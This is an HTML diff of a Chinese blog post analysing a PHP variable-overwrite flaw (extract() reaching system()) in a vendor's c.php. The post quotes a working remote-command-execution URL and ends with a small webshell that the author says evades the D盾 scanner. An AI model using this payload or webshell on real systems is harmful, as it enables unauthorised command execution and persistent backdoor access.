@@ -171,7 +171,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      46 字
+      422 字
     </span>
   
 
@@ -181,7 +181,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      5
        分钟
     </span>
   
@@ -214,8 +214,30 @@
             <h1 style="display: none">某X服审计</h1>
             
             <div class="markdown-body" id="post-body">
-              <h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>最近hw的举行区间，某服爆出一起神奇的漏洞。那咱就对他的代码分析分析是怎么产生的这个漏洞点。</p>
-<p><img src="/images/edr/1.png" srcset="/img/loading.gif"></p>
+              <h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>最近hw的举行区间，某服爆出一起神奇的漏洞。那咱就对他的代码分析分析是怎么产生的这个漏洞点。 </p>
+<ul>
+<li>据网上公开的paylaod显示，该漏洞利用方式难度较低。<br><code>https://x.x.x.x/tool/log/c.php?strip_slashes=system&amp;host=id</code><br><img src="/images/edr/1.png" srcset="/img/loading.gif">  </li>
+</ul>
+<h2 id="原代码分析"><a href="#原代码分析" class="headerlink" title="原代码分析"></a>原代码分析</h2><h3 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h3><p>应为这个漏洞点源自于php中的变量覆盖，也就是自定义的参数值替换原有变量值的情况，也称为变量覆盖漏洞。</p>
+<pre><code class="hljs aidl">&lt;?php
+$a &#x3D; 1;    &#x2F;&#x2F;原变量值为1
+extract(array(&#39;a&#39; &#x3D;&gt; &#39;3&#39;));&#x2F;&#x2F;经过extract()函数对$b处理后
+echo $a;    &#x2F;&#x2F;输出结果为3
+?&gt;</code></pre>
+
+<h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><p>根据payload分析，该漏洞点定存在于c.php代码中，首先先看下show_form函数。不难发现show_form的所接受的参数$params可以被extract函数进行变量覆盖。</p>
+<p><img src="/images/edr/2.png" srcset="/img/loading.gif">  </p>
+<h3 id="可变量输入"><a href="#可变量输入" class="headerlink" title="可变量输入"></a>可变量输入</h3><p>那既然extract可以进行变量覆盖，所以就要寻找show_form($params)所接受的参数是否为可变量，或如何构造可变量。接着往下走$show_form($_REQUEST)这段函数让$params成为可能。<br><img src="/images/edr/3.png" srcset="/img/loading.gif">  </p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>既然已经有了可控变量，那如何构造出所需的payload？$strip_slashes($host)该函数其实已经帮我们完成了构造，直接用即可。在传入所需参数后该函数就变为system(id)，所以只需变host即可。<br><img src="/images/edr/4.png" srcset="/img/loading.gif">  </p>
+<h2 id="免杀webshell"><a href="#免杀webshell" class="headerlink" title="免杀webshell"></a>免杀webshell</h2><p>既然知道了原理，就顺手写一个webshell看看其是否拥有免杀功能。哈哈哈。</p>
+<pre><code class="aidl">&lt;?php    
+function kk($params)&#123;
+    extract($params);
+    $qq($jj);
+&#125;;
+kk($_REQUEST);
+?&gt;</code></pre>
+<p><img src="/images/edr/5.png" srcset="/img/loading.gif"><br>D盾测试，效果还可以。<br><img src="/images/edr/6.png" srcset="/img/loading.gif"> </p>
 
             </div>
             <hr>
